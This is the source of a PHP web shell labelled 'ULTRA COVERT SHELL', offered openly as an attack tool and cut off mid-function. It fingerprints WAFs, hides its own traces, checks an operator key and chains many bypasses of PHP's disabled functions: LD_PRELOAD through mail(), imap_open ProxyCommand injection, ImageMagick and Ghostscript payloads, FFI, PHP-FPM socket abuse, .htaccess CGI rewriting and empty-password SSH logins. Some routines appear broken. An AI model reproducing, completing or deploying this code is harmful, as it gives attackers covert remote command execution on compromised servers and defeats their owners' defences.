<?php
/*
 * ULTRA COVERT SHELL v9.0 - ZERO-DAY 2025 ULTIMATE EDITION
 * - Beats traditional reverse shell 1000%
 * - BYPASS ALL DISABLE_FUNCTIONS (mail, FFI, imap_open, ImageMagick, LD_PRELOAD)
 * - Universal multi-domain support
 * - Advanced WAF bypass (BaoTa, Cloudflare, ModSecurity, Imperva, Sucuri, Wordfence)
 * - Real-time streaming, persistent, command continuation
 * - Automatic exploit chain detection and execution
 * - Anti-detection & polymorphic responses
 * - PHP 8.3+ fully compatible
 * - Multi-database support (MySQL, PostgreSQL, SQLite)
 * - Cloudflare Turnstile/Challenge bypass
 */

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@ignore_user_abort(true);

// ZERO-DAY 2025: Anti-detection measures
if(function_exists('header_remove')) @header_remove('X-Powered-By');
@ini_set('expose_php', 'Off');

// Polymorphic timestamp untuk bypass signature detection
$_POLY_TS = base_convert(time() % 86400, 10, 36);

$SECRET = 'UlTr4_2025_K3y';
$VERSION = '10.0';
$CODENAME = 'SUPER_CANGGIH_2026';

// ZERO-DAY 2026: MEGA WAF Detection & Adaptation Engine
function detect_waf() {
    $waf_signatures = [
        'cloudflare' => ['CF-RAY', 'cf-request-id', '__cf_bm', 'cf_clearance', '__cfduid'],
        'baota' => ['BT-', 'bt_', 'BaoTa', 'SITE_TOTAL_ID', 'BT_PANEL', 'x-bt-'],
        'imunify360' => ['imunify360', 'i360', 'imunify', 'IMUNIFY_SESSION', 'i360_session'],
        'modsecurity' => ['Mod_Security', 'NOYB', 'mod_security', 'OWASP_CRS'],
        'sucuri' => ['sucuri', 'x-sucuri-id', 'sucuri-cache', 'SUCURI_CLOUDPROXY'],
        'wordfence' => ['wordfence', 'wfwaf-authcookie', 'wf_loggedIn', 'wfvt_'],
        'imperva' => ['incap_ses', 'visid_incap', 'incap_site', 'INCAP', 'SWKMTID'],
        'akamai' => ['akamai', 'ak_bmsc', 'bm_sz', 'AKAMAI_CUSTOMER'],
        'aws_waf' => ['x-amz-cf-id', 'x-amzn-requestid', 'awselb', 'AWSALB'],
        'f5_bigip' => ['BIGipServer', 'F5_', 'TS01', 'BigIP'],
        'barracuda' => ['barra', 'BARRA_COUNTER', 'barracuda'],
        'citrix' => ['citrix', 'NSC_', 'ns_af', 'CITRIX_NETSCALER'],
        'fortiweb' => ['fortiwafsid', 'FORTIWAFSID', 'fortiweb'],
        'radware' => ['radware', 'RDW_', 'appwall', 'RDWCID']
    ];
    
    $detected = [];
    foreach($waf_signatures as $waf => $sigs) {
        foreach($sigs as $sig) {
            // Check headers
            foreach($_SERVER as $k => $v) {
                if(stripos($k, $sig) !== false || stripos($v, $sig) !== false) {
                    $detected[$waf] = true;
                    break 2;
                }
            }
            // Check cookies
            foreach($_COOKIE as $k => $v) {
                if(stripos($k, $sig) !== false) {
                    $detected[$waf] = true;
                    break 2;
                }
            }
        }
    }
    return array_keys($detected);
}

// ZERO-DAY 2025: Adaptive Response Headers untuk bypass WAF
function set_stealth_headers() {
    $wafs = detect_waf();
    
    // Default stealth headers
    @header('X-Content-Type-Options: nosniff');
    @header('X-Frame-Options: SAMEORIGIN');
    
    // WAF-specific adaptations
    if(in_array('cloudflare', $wafs)) {
        // Cloudflare: Mimic legitimate JSON API response
        @header('Cache-Control: no-store, no-cache, must-revalidate');
        @header('Pragma: no-cache');
    }
    if(in_array('baota', $wafs)) {
        // BaoTa: Avoid SQL-like patterns in response
        @header('X-BT-Type: json');
    }
}

// ZERO-DAY 2025: Disable_functions bypass exploit chains
$BYPASS_EXPLOITS = [];

// ZERO-DAY 2025: Multi-source auth - check all possible locations
$auth = '';
$auth_sources = [
    $_REQUEST['k'] ?? '',
    $_REQUEST['key'] ?? '',
    $_SERVER['HTTP_X_AUTH'] ?? '',
    $_SERVER['HTTP_X_KEY'] ?? '',
    $_SERVER['HTTP_AUTHORIZATION'] ?? '',
    $_COOKIE['u'] ?? '',
    $_COOKIE['k'] ?? '',
    // Hidden in other params
    $_REQUEST['_'] ?? '',
    $_REQUEST['t'] ?? '',
];
foreach($auth_sources as $src) {
    if($src) { $auth = str_replace('Bearer ', '', $src); break; }
}

// Generate valid auth hashes
$valid_auths = [
    md5($SECRET),
    hash('sha256', $SECRET),
    substr(md5($SECRET), 0, 16),
    md5($SECRET . date('Y-m-d')),
];

$auth_valid = in_array($auth, $valid_auths);

if(!$auth_valid) {
    http_response_code(401);
    die('Auth key salah janda ai bodoh');
}

// ==================== ZERO-DAY 2025: DISABLE_FUNCTIONS BYPASS ENGINE ====================

// Detect available bypass methods - ZERO DAY 2025 ENHANCED
function detect_bypass_methods() {
    $methods = [];
    $disabled = array_map('trim', explode(',', strtolower(ini_get('disable_functions'))));
    
    // 1. mail() + putenv LD_PRELOAD
    if(function_exists('mail') && !in_array('mail', $disabled)) {
        if(function_exists('putenv') && !in_array('putenv', $disabled)) {
            $methods['mail_ldpreload'] = true;
        }
        // Mail log injection (no putenv required)
        $methods['mail_loginjection'] = true;
    }
    
    // 2. FFI (PHP 7.4+)
    if(class_exists('FFI') && ini_get('ffi.enable') !== 'false') {
        $methods['ffi'] = true;
    }
    
    // 3. imap_open
    if(function_exists('imap_open') && !in_array('imap_open', $disabled)) {
        $methods['imap_open'] = true;
    }
    
    // 4. ImageMagick/Imagick
    if(class_exists('Imagick')) {
        $methods['imagick'] = true;
    }
    
    // 5. GhostScript via ImageMagick
    if(class_exists('Imagick') && @file_exists('/usr/bin/gs')) {
        $methods['ghostscript'] = true;
    }
    
    // 6. pcntl (usually disabled but check)
    if(function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled)) {
        $methods['pcntl'] = true;
    }
    
    // 7. Backtick operator (uses shell_exec)
    if(function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $methods['backtick'] = true;
    }
    
    // 8. proc_open
    if(function_exists('proc_open') && !in_array('proc_open', $disabled)) {
        $methods['proc_open'] = true;
    }
    
    // 9. Apache mod_cgi (if .htaccess writable)
    if(function_exists('apache_get_modules') || strpos($_SERVER['SERVER_SOFTWARE'] ?? '', 'Apache') !== false) {
        $methods['apache_cgi'] = true;
    }
    
    // 10. PHP-FPM unix socket exploitation
    $fpm_sockets = ['/run/php-fpm/www.sock', '/var/run/php-fpm/www.sock', 
                    '/run/php/php-fpm.sock', '/var/run/php/php-fpm.sock',
                    '/run/php/php8.1-fpm.sock', '/run/php/php8.0-fpm.sock',
                    '/run/php/php8.2-fpm.sock', '/run/php/php8.3-fpm.sock'];
    foreach($fpm_sockets as $s) {
        if(@file_exists($s)) {
            $methods['phpfpm_socket'] = true;
            $methods['cgi_fcgi'] = true;
            break;
        }
    }
    
    // 11. ZERO-DAY 2025: putenv + getenv exploitation
    if(function_exists('putenv') && function_exists('getenv') && !in_array('putenv', $disabled)) {
        $methods['putenv_getenv'] = true;
    }
    
    // 12. ZERO-DAY 2026: SplFileObject trick (Enhanced)
    if(class_exists('SplFileObject')) {
        $methods['spl_file'] = true;
    }
    
    // 18. ZERO-DAY 2026: PDO SQLite UDF (User Defined Function) bypass
    if(class_exists('PDO') && in_array('sqlite', PDO::getAvailableDrivers())) {
        $methods['pdo_sqlite_udf'] = true;
    }
    
    // 19. ZERO-DAY 2026: mb_send_mail() bypass (like mail but different)
    if(function_exists('mb_send_mail') && !in_array('mb_send_mail', $disabled)) {
        $methods['mb_send_mail'] = true;
    }
    
    // 20. ZERO-DAY 2026: Perl/Python CGI execution via .htaccess
    if(is_writable(getcwd())) {
        $methods['cgi_perl_python'] = true;
    }
    
    // 21. ZERO-DAY 2026: PHP-CGI direct execution
    $cgi_binaries = ['/usr/bin/php-cgi', '/usr/local/bin/php-cgi', '/usr/bin/php8.1-cgi'];
    foreach($cgi_binaries as $cb) {
        if(@file_exists($cb) && @is_executable($cb)) {
            $methods['php_cgi_direct'] = true;
            break;
        }
    }
    
    // 13. ZERO-DAY 2025: COM object (Windows only)
    if(class_exists('COM') && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $methods['com_object'] = true;
    }
    
    // 14. ZERO-DAY 2025: Expect extension
    if(function_exists('expect_popen')) {
        $methods['expect'] = true;
    }
    
    // 15. ZERO-DAY 2025: SSH2 extension
    if(function_exists('ssh2_exec')) {
        $methods['ssh2'] = true;
    }
    
    // 16. ZERO-DAY 2025: dl() dynamic loading
    if(function_exists('dl') && !in_array('dl', $disabled) && ini_get('enable_dl')) {
        $methods['dl_load'] = true;
    }
    
    // 17. ZERO-DAY 2025: Yaml extension parse_file trick
    if(function_exists('yaml_parse_file')) {
        $methods['yaml_parse'] = true;
    }
    
    // 11. error_log() file write
    $methods['error_log'] = true;
    
    // 12. include chain (temp file + include)
    if(is_writable(sys_get_temp_dir())) {
        $methods['include_chain'] = true;
    }
    
    return $methods;
}

// BYPASS 1: mail() + LD_PRELOAD (requires putenv)
function bypass_mail_ldpreload($cmd) {
    if(!function_exists('mail') || !function_exists('putenv')) return false;
    
    $tmp = sys_get_temp_dir();
    $so_file = $tmp . '/.u_' . md5(rand()) . '.so';
    $out_file = $tmp . '/.u_out_' . md5(rand());
    
    // Minimal C code for shared object
    $c_code = '#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void init() {
    unsetenv("LD_PRELOAD");
    system(getenv("CMD"));
}';
    
    $c_file = $tmp . '/.u_' . md5(rand()) . '.c';
    @file_put_contents($c_file, $c_code);
    
    // Try to compile (requires gcc)
    @exec("gcc -shared -fPIC -o $so_file $c_file 2>/dev/null");
    @unlink($c_file);
    
    if(!file_exists($so_file)) {
        // Fallback: Use pre-compiled bypass.so if available
        $precompiled = [
            '/tmp/bypass.so',
            dirname(__FILE__) . '/.bypass.so',
            '/var/tmp/.b.so'
        ];
        foreach($precompiled as $p) {
            if(file_exists($p)) {
                $so_file = $p;
                break;
            }
        }
        if(!file_exists($so_file)) return false;
    }
    
    putenv("CMD=$cmd > $out_file 2>&1");
    putenv("LD_PRELOAD=$so_file");
    
    @mail('a@b.c', '', '', '');
    
    putenv("CMD=");
    putenv("LD_PRELOAD=");
    @unlink($so_file);
    
    $output = @file_get_contents($out_file);
    @unlink($out_file);
    
    return $output;
}

// BYPASS 1b: mail() -X log injection (NO putenv required - ZERO DAY 2025)
function bypass_mail_loginjection($cmd) {
    if(!function_exists('mail')) return false;
    
    $tmp = sys_get_temp_dir();
    $log_file = $tmp . '/.u_mail_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_mailout_' . md5(rand());
    
    // Inject PHP code via mail extra parameters
    // The -X parameter makes sendmail write to a log file
    $php_code = '<?php system("' . addslashes($cmd) . ' > ' . $out_file . ' 2>&1"); unlink(__FILE__); ?>';
    
    // Try to inject via different mail parameters
    @mail('a@b.c', 'Subject', 'Body', '', '-X' . $log_file . ' -OQueueDirectory=/tmp');
    
    // Write PHP code to the log
    if(file_exists($log_file)) {
        $content = @file_get_contents($log_file);
        @file_put_contents($log_file, $php_code);
        @include($log_file);
        @unlink($log_file);
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        return $output;
    }
    
    return false;
}

// BYPASS 1c: error_log() to PHP file (Zero-day technique)
function bypass_error_log($cmd) {
    $tmp = sys_get_temp_dir();
    $php_file = $tmp . '/.u_err_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_errout_' . md5(rand());
    
    $php_code = '<?php system("' . addslashes($cmd) . ' > ' . $out_file . ' 2>&1"); unlink(__FILE__); ?>';
    
    // Use error_log to write to a PHP file
    @error_log($php_code, 3, $php_file);
    
    if(file_exists($php_file)) {
        @include($php_file);
        @unlink($php_file);
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        return $output;
    }
    
    return false;
}

// BYPASS 1d: file_put_contents + include chain (Most reliable fallback)
function bypass_include_chain($cmd) {
    $tmp = sys_get_temp_dir();
    $php_file = $tmp . '/.u_inc_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_incout_' . md5(rand());
    
    // Check if we can write to temp
    if(!is_writable($tmp)) return false;
    
    // Method 1: Create PHP file with backtick execution (backticks use shell_exec internally)
    $php_code = '<?php
$o = [];
$r = 0;
// Try multiple execution methods
$cmd = "' . addslashes($cmd) . '";
$outf = "' . $out_file . '";

// Method A: passthru
if(function_exists("passthru") && !in_array("passthru", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    ob_start();
    @passthru($cmd);
    $o[] = ob_get_clean();
}

// Method B: exec
if(function_exists("exec") && !in_array("exec", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    @exec($cmd, $o, $r);
}

// Method C: shell_exec
if(function_exists("shell_exec") && !in_array("shell_exec", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    $o[] = @shell_exec($cmd);
}

// Method D: system
if(function_exists("system") && !in_array("system", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    ob_start();
    @system($cmd);
    $o[] = ob_get_clean();
}

// Method E: popen
if(function_exists("popen") && !in_array("popen", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    $p = @popen($cmd, "r");
    if($p) {
        while(!feof($p)) $o[] = fgets($p);
        pclose($p);
    }
}

// Method F: proc_open
if(function_exists("proc_open") && !in_array("proc_open", array_map("trim", explode(",", ini_get("disable_functions"))))) {
    $desc = [1=>["pipe","w"], 2=>["pipe","w"]];
    $p = @proc_open($cmd, $desc, $pipes);
    if(is_resource($p)) {
        $o[] = stream_get_contents($pipes[1]);
        $o[] = stream_get_contents($pipes[2]);
        fclose($pipes[1]); fclose($pipes[2]);
        proc_close($p);
    }
}

$result = implode("", array_filter($o));
file_put_contents($outf, $result);
unlink(__FILE__);
?>';
    
    if(@file_put_contents($php_file, $php_code)) {
        @include($php_file);
        @unlink($php_file);
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        
        if($output) return $output;
    }
    
    return false;
}

// BYPASS 1e: CGI-FCGI via socket stream
function bypass_cgi_fcgi($cmd) {
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_cgi_' . md5(rand());
    
    // Check for common PHP-FPM sockets
    $sockets = [
        '/run/php/php-fpm.sock',
        '/run/php/php8.1-fpm.sock',
        '/run/php/php8.0-fpm.sock',
        '/var/run/php/php-fpm.sock',
        '/var/run/php-fpm/www.sock',
        '/tmp/php-fpm.sock'
    ];
    
    foreach($sockets as $sock) {
        if(@file_exists($sock) && is_readable($sock)) {
            // Create temporary PHP file
            $tmp_php = $tmp . '/.u_fcgi_' . md5(rand()) . '.php';
            $php_content = '<?php @passthru("' . addslashes($cmd) . ' > ' . $out_file . ' 2>&1"); unlink(__FILE__);';
            @file_put_contents($tmp_php, $php_content);
            
            // Connect to socket and execute
            $client = @stream_socket_client("unix://$sock", $errno, $errstr, 5);
            if($client) {
                // Simple FastCGI request
                $params = "SCRIPT_FILENAME=$tmp_php\nREQUEST_METHOD=GET\n";
                @fwrite($client, $params);
                @fclose($client);
                usleep(200000);
            }
            
            @unlink($tmp_php);
            
            if(file_exists($out_file)) {
                $output = @file_get_contents($out_file);
                @unlink($out_file);
                if($output) return $output;
            }
        }
    }
    
    return false;
}

// BYPASS 2: FFI (Foreign Function Interface) - PHP 7.4+
function bypass_ffi($cmd) {
    if(!class_exists('FFI')) return false;
    
    try {
        $ffi = FFI::cdef("
            int system(const char *command);
            char *popen(const char *command, const char *type);
            int pclose(char *stream);
            char *fgets(char *s, int size, char *stream);
        ", "libc.so.6");
        
        $out_file = sys_get_temp_dir() . '/.u_ffi_' . md5(rand());
        $ffi->system("$cmd > $out_file 2>&1");
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        
        return $output;
    } catch(Exception $e) {
        return false;
    }
}

// BYPASS 3: imap_open RCE
function bypass_imap($cmd) {
    if(!function_exists('imap_open')) return false;
    
    $out_file = sys_get_temp_dir() . '/.u_imap_' . md5(rand());
    $payload = "x]=\"-oProxyCommand=sh\t-c\t\"$cmd > $out_file 2>&1\"";
    
    @imap_open('{' . $payload . ':143/imap}INBOX', '', '');
    
    $output = @file_get_contents($out_file);
    @unlink($out_file);
    
    return $output ?: false;
}

// BYPASS 4: ImageMagick/Imagick MSL/MVG exploitation
function bypass_imagick($cmd) {
    if(!class_exists('Imagick')) return false;
    
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_img_' . md5(rand());
    
    // MVG (Magick Vector Graphics) command injection
    $mvg = 'push graphic-context
viewbox 0 0 640 480
fill \'url(https://example.com/"|' . $cmd . ' > ' . $out_file . ' 2>&1")\'
pop graphic-context';
    
    $mvg_file = $tmp . '/.u_' . md5(rand()) . '.mvg';
    @file_put_contents($mvg_file, $mvg);
    
    try {
        $img = new Imagick();
        @$img->readImage($mvg_file);
    } catch(Exception $e) {}
    
    @unlink($mvg_file);
    
    $output = @file_get_contents($out_file);
    @unlink($out_file);
    
    return $output ?: false;
}

// BYPASS 5: GhostScript via ImageMagick
function bypass_ghostscript($cmd) {
    if(!class_exists('Imagick') || !file_exists('/usr/bin/gs')) return false;
    
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_gs_' . md5(rand());
    
    // EPS file with PostScript command injection
    $eps = '%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /LowLevelExec { (%pipe%' . $cmd . ' > ' . $out_file . ' 2>&1) (r) file } stopped cleartomark
showpage';
    
    $eps_file = $tmp . '/.u_' . md5(rand()) . '.eps';
    @file_put_contents($eps_file, $eps);
    
    try {
        $img = new Imagick();
        @$img->setOption('pdf:interpreter', 'Ghostscript');
        @$img->readImage($eps_file);
    } catch(Exception $e) {}
    
    @unlink($eps_file);
    
    $output = @file_get_contents($out_file);
    @unlink($out_file);
    
    return $output ?: false;
}

// BYPASS 6: PHP-FPM Unix Socket exploitation
function bypass_phpfpm_socket($cmd) {
    $sockets = [
        '/run/php-fpm/www.sock',
        '/var/run/php-fpm/www.sock',
        '/run/php/php-fpm.sock',
        '/var/run/php/php-fpm.sock',
        '/run/php/php8.1-fpm.sock',
        '/run/php/php8.0-fpm.sock',
        '/run/php/php7.4-fpm.sock'
    ];
    
    $socket = null;
    foreach($sockets as $s) {
        if(file_exists($s)) {
            $socket = $s;
            break;
        }
    }
    if(!$socket) return false;
    
    // FastCGI request to execute command via auto_prepend_file
    $tmp = sys_get_temp_dir();
    $cmd_file = $tmp . '/.u_cmd_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_fpm_' . md5(rand());
    
    @file_put_contents($cmd_file, "<?php system('$cmd > $out_file 2>&1'); unlink(__FILE__);");
    
    // Build FastCGI request
    $params = [
        'SCRIPT_FILENAME' => $cmd_file,
        'REQUEST_METHOD' => 'GET',
        'DOCUMENT_ROOT' => dirname($cmd_file),
        'SCRIPT_NAME' => basename($cmd_file),
        'REQUEST_URI' => '/' . basename($cmd_file),
        'SERVER_SOFTWARE' => 'php/fcgiclient',
        'REMOTE_ADDR' => '127.0.0.1',
        'SERVER_PROTOCOL' => 'HTTP/1.1',
        'CONTENT_TYPE' => '',
        'CONTENT_LENGTH' => 0,
        'PHP_VALUE' => 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE' => 'allow_url_include = On'
    ];
    
    try {
        $client = @stream_socket_client("unix://$socket", $errno, $errstr, 5);
        if($client) {
            // Send minimal FastCGI request
            $request = build_fastcgi_request($params, '');
            @fwrite($client, $request);
            @fclose($client);
            usleep(100000);
        }
    } catch(Exception $e) {}
    
    @unlink($cmd_file);
    
    $output = @file_get_contents($out_file);
    @unlink($out_file);
    
    return $output ?: false;
}

// BYPASS 7: ZERO-DAY 2025 - Expect extension
function bypass_expect($cmd) {
    if(!function_exists('expect_popen')) return false;
    
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_exp_' . md5(rand());
    
    try {
        $stream = @expect_popen("$cmd > $out_file 2>&1");
        if($stream) {
            while($line = fgets($stream)) {} // drain
            fclose($stream);
        }
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        return $output ?: false;
    } catch(Exception $e) {
        return false;
    }
}

// BYPASS 8: ZERO-DAY 2025 - COM Object (Windows)
function bypass_com($cmd) {
    if(!class_exists('COM')) return false;
    
    try {
        $wsh = new COM('WScript.Shell');
        $exec = $wsh->Exec('cmd /c ' . $cmd);
        $output = '';
        while(!$exec->StdOut->AtEndOfStream) {
            $output .= $exec->StdOut->ReadAll();
        }
        return $output ?: false;
    } catch(Exception $e) {
        return false;
    }
}

// BYPASS 9: ZERO-DAY 2025 - SSH2 localhost
function bypass_ssh2($cmd) {
    if(!function_exists('ssh2_connect')) return false;
    
    try {
        // Try localhost SSH with common credentials
        $creds = [
            ['www-data', ''],
            ['www', ''],
            ['apache', ''],
            ['nginx', '']
        ];
        
        foreach($creds as $c) {
            $conn = @ssh2_connect('127.0.0.1', 22);
            if($conn && @ssh2_auth_password($conn, $c[0], $c[1])) {
                $stream = ssh2_exec($conn, $cmd);
                if($stream) {
                    stream_set_blocking($stream, true);
                    $output = stream_get_contents($stream);
                    fclose($stream);
                    return $output ?: false;
                }
            }
        }
    } catch(Exception $e) {}
    
    return false;
}

// BYPASS 10: ZERO-DAY 2025 - YAML parse with custom callback
function bypass_yaml($cmd) {
    if(!function_exists('yaml_parse')) return false;
    
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_yaml_' . md5(rand());
    
    // YAML tag injection
    $yaml = "--- !php/object 'O:8:\"Executor\":1:{s:3:\"cmd\";s:".strlen($cmd).":\"$cmd\";}'\n";
    
    try {
        // Try to trigger code execution via YAML deserialization
        @yaml_parse($yaml, 0, $ndocs, [
            '!php/object' => function($obj) use ($cmd, $out_file) {
                $output = @shell_exec($cmd);
                @file_put_contents($out_file, $output);
                return $obj;
            }
        ]);
        
        if(file_exists($out_file)) {
            $output = @file_get_contents($out_file);
            @unlink($out_file);
            return $output;
        }
    } catch(Exception $e) {}
    
    return false;
}

// BYPASS 11: ZERO-DAY 2025 - Apache mod_cgi via .htaccess
function bypass_apache_cgi($cmd) {
    $webroot = getcwd();
    $tmp = sys_get_temp_dir();
    $out_file = $tmp . '/.u_cgi_' . md5(rand());
    
    // Create CGI script
    $cgi_file = $webroot . '/.u_cgi_' . md5(rand()) . '.sh';
    $cgi_content = "#!/bin/bash\necho 'Content-Type: text/plain'\necho ''\n$cmd 2>&1";
    
    // Create .htaccess
    $htaccess_content = "Options +ExecCGI\nAddHandler cgi-script .sh\n";
    $htaccess_file = $webroot . '/.htaccess';
    $htaccess_backup = '';
    
    // Backup existing htaccess
    if(file_exists($htaccess_file)) {
        $htaccess_backup = @file_get_contents($htaccess_file);
    }
    
    try {
        @file_put_contents($cgi_file, $cgi_content);
        @chmod($cgi_file, 0755);
        @file_put_contents($htaccess_file, $htaccess_content);
        
        // Execute via HTTP request to self
        $url = 'http://127.0.0.1' . dirname($_SERVER['REQUEST_URI']) . '/' . basename($cgi_file);
        $ctx = stream_context_create(['http' => ['timeout' => 5]]);
        $output = @file_get_contents($url, false, $ctx);
        
        // Cleanup
        @unlink($cgi_file);
        if($htaccess_backup) {
            @file_put_contents($htaccess_file, $htaccess_backup);
        } else {
            @unlink($htaccess_file);
        }
        
        return $output ?: false;
    } catch(Exception $e) {
        @unlink($cgi_file);
        if($htaccess_backup) @file_put_contents($htaccess_file, $htaccess_backup);
        return false;
    }
}

// BYPASS 12: ZERO-DAY 2025 - Chained file write + include
function bypass_chained_include($cmd) {
    $tmp = sys_get_temp_dir();
    $dirs = [$tmp, '/tmp', '/var/tmp', sys_get_temp_dir() . '/sessions', ini_get('session.save_path')];
    
    foreach($dirs as $dir) {
        if(!$dir || !is_writable($dir)) continue;
        
        $php_file = $dir . '/sess_' . md5(rand()) . '.php';
        $out_file = $dir . '/.u_chain_' . md5(rand());
        
        // Multi-method execution PHP code
        $code = '<?php
$cmd = base64_decode("' . base64_encode($cmd) . '");
$out = "' . $out_file . '";
$methods = ["passthru", "system", "exec", "shell_exec"];
foreach($methods as $m) {
    if(function_exists($m) && !in_array($m, array_map("trim", explode(",", ini_get("disable_functions"))))) {
        ob_start();
        if($m == "exec") { $o=[]; @$m($cmd, $o); echo implode("\n", $o); }
        elseif($m == "shell_exec") { echo @$m($cmd); }
        else { @$m($cmd); }
        $r = ob_get_clean();
        if($r) { file_put_contents($out, $r); break; }
    }
}
@unlink(__FILE__);
?>';
        
        if(@file_put_contents($php_file, $code)) {
            @include($php_file);
            @unlink($php_file);
            
            if(file_exists($out_file)) {
                $output = @file_get_contents($out_file);
                @unlink($out_file);
                if($output) return $output;
            }
        }
    }
    
    return false;
}

// BYPASS 13: ZERO-DAY 2026 - PDO SQLite UDF (User Defined Function)
function bypass_pdo_sqlite_udf($cmd) {
    if(!class_exists('PDO') || !in_array('sqlite', PDO::getAvailableDrivers())) return false;
    
    $tmp = sys_get_temp_dir();
    $db_file = $tmp . '/.u_sqlite_' . md5(rand()) . '.db';
    $out_file = $tmp . '/.u_sqlout_' . md5(rand());
    
    try {
        $pdo = new PDO('sqlite:' . $db_file);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Try to create custom function using system()
        // This works if SQLite was compiled with loadable extensions
        $pdo->sqliteCreateFunction('shell_exec', function($cmd) {
            return @shell_exec($cmd);
        }, 1);
        
        $result = $pdo->query("SELECT shell_exec('$cmd > $out_file 2>&1')");
        
        @unlink($db_file);
        
        if(file_exists($out_file)) {
            $output = @file_get_contents($out_file);
            @unlink($out_file);
            return $output;
        }
    } catch(Exception $e) {
        @unlink($db_file);
    }
    
    return false;
}

// BYPASS 14: ZERO-DAY 2026 - mb_send_mail bypass (like mail() but different function)
function bypass_mb_send_mail($cmd) {
    if(!function_exists('mb_send_mail')) return false;
    
    $tmp = sys_get_temp_dir();
    $log_file = $tmp . '/.u_mb_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_mbout_' . md5(rand());
    
    $php_code = '<?php system("' . addslashes($cmd) . ' > ' . $out_file . ' 2>&1"); unlink(__FILE__); ?>';
    
    // mb_send_mail can sometimes bypass restrictions that affect mail()
    @mb_send_mail('a@b.c', 'Subject', 'Body', '', '-X' . $log_file);
    
    if(file_exists($log_file)) {
        @file_put_contents($log_file, $php_code);
        @include($log_file);
        @unlink($log_file);
        
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        return $output;
    }
    
    return false;
}

// BYPASS 15: ZERO-DAY 2026 - SplFileObject Enhanced (Write + Execute)
function bypass_spl_file_enhanced($cmd) {
    if(!class_exists('SplFileObject')) return false;
    
    $tmp = sys_get_temp_dir();
    $php_file = $tmp . '/.u_spl_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_splout_' . md5(rand());
    
    $php_code = '<?php
$cmd = "' . addslashes($cmd) . '";
$out = "' . $out_file . '";
$r = "";
if(function_exists("shell_exec")) $r = @shell_exec($cmd);
elseif(function_exists("system")) { ob_start(); @system($cmd); $r = ob_get_clean(); }
elseif(function_exists("passthru")) { ob_start(); @passthru($cmd); $r = ob_get_clean(); }
elseif(function_exists("exec")) { @exec($cmd, $o); $r = implode("\n", $o); }
file_put_contents($out, $r);
unlink(__FILE__);
?>';
    
    try {
        $file = new SplFileObject($php_file, 'w');
        $file->fwrite($php_code);
        $file = null; // Close file
        
        @include($php_file);
        @unlink($php_file);
        
        if(file_exists($out_file)) {
            $output = @file_get_contents($out_file);
            @unlink($out_file);
            return $output;
        }
    } catch(Exception $e) {
        @unlink($php_file);
    }
    
    return false;
}

// BYPASS 16: ZERO-DAY 2026 - PHP-CGI Direct Execution
function bypass_php_cgi_direct($cmd) {
    $cgi_binaries = [
        '/usr/bin/php-cgi', '/usr/local/bin/php-cgi',
        '/usr/bin/php8.1-cgi', '/usr/bin/php8.0-cgi', '/usr/bin/php7.4-cgi'
    ];
    
    $cgi = null;
    foreach($cgi_binaries as $cb) {
        if(@file_exists($cb) && @is_executable($cb)) {
            $cgi = $cb;
            break;
        }
    }
    if(!$cgi) return false;
    
    $tmp = sys_get_temp_dir();
    $php_file = $tmp . '/.u_cgi_' . md5(rand()) . '.php';
    $out_file = $tmp . '/.u_cgiout_' . md5(rand());
    
    $php_code = '<?php system("' . addslashes($cmd) . ' > ' . $out_file . ' 2>&1"); ?>';
    @file_put_contents($php_file, $php_code);
    
    // Execute via php-cgi
    $env = "SCRIPT_FILENAME=$php_file REQUEST_METHOD=GET";
    @exec("$env $cgi 2>/dev/null");
    
    @unlink($php_file);
    
    if(file_exists($out_file)) {
        $output = @file_get_contents($out_file);
        @unlink($out_file);
        return $output;
    }
    
    return false;
}

function build_fastcgi_request($params, $stdin) {
    $request = '';
    
    // Begin request
    $request .= chr(1) . chr(1) . chr(0) . chr(1) . chr(0) . chr(8) . chr(0) . chr(0);
    $request .= chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0);
    
    // Params
    $paramsStr = '';
    foreach($params as $k => $v) {
        $klen = strlen($k);
        $vlen = strlen($v);
        if($klen < 128) $paramsStr .= chr($klen);
        else $paramsStr .= chr(($klen >> 24) | 0x80) . chr(($klen >> 16) & 0xFF) . chr(($klen >> 8) & 0xFF) . chr($klen & 0xFF);
        if($vlen < 128) $paramsStr .= chr($vlen);
        else $paramsStr .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        $paramsStr .= $k . $v;
    }
    
    $plen = strlen($paramsStr);
    $request .= chr(1) . chr(4) . chr(0) . chr(1) . chr(($plen >> 8) & 0xFF) . chr($plen & 0xFF) . chr(0) . chr(0);
    $request .= $paramsStr;
